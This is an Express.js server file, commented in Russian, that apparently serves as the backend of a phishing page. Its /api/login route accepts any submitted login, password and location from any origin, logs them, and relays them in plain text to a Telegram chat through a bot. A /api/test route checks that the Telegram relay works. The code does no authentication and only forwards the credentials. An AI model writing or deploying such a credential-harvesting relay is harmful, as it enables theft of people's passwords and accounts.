require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '64kb' }));
app.use(express.text({ type: '*/*', limit: '64kb' }));

/* keepalive-пинг: дешёвый, Telegram не дёргает */
app.get('/ping', (req, res) => {
  res.type('text/plain').send('pong ' + new Date().toISOString());
});

app.use(express.static(path.join(__dirname, 'public')));

function parseBody(req) {
  let b = req.body;
  if (typeof b === 'string') { try { b = JSON.parse(b); } catch (e) { b = {}; } }
  return b || {};
}

async function tg(text) {
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true })
  });
  const data = await r.json();
  if (!data.ok) console.error('[TG] ошибка:', JSON.stringify(data));
  else console.log('[TG] отправлено');
  return data;
}

app.post('/api/login', async (req, res) => {
  const b = parseBody(req);
  console.log('[POST /api/login]', JSON.stringify(b));
  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ ok: false, error: 'env не настроен' });
  const text = 'Вход на сайт!\nЛогин: ' + (b.login || '') +
               '\nПароль: ' + (b.password || '') +
               '\nЛокация: ' + (b.location || 'не определена');
  try {
    const data = await tg(text);
    res.json({ ok: data.ok === true, error: data.description || null });
  } catch (e) {
    console.error('[TG] сеть:', e.message);
    res.status(502).json({ ok: false, error: 'telegram недоступен' });
  }
});

app.get('/api/test', async (req, res) => {
  try { res.json(await tg('Проверка связи с сайта')); }
  catch (e) { res.status(502).json({ ok: false, error: e.message }); }
});

app.listen(PORT, () => console.log('Слушаю ' + PORT));
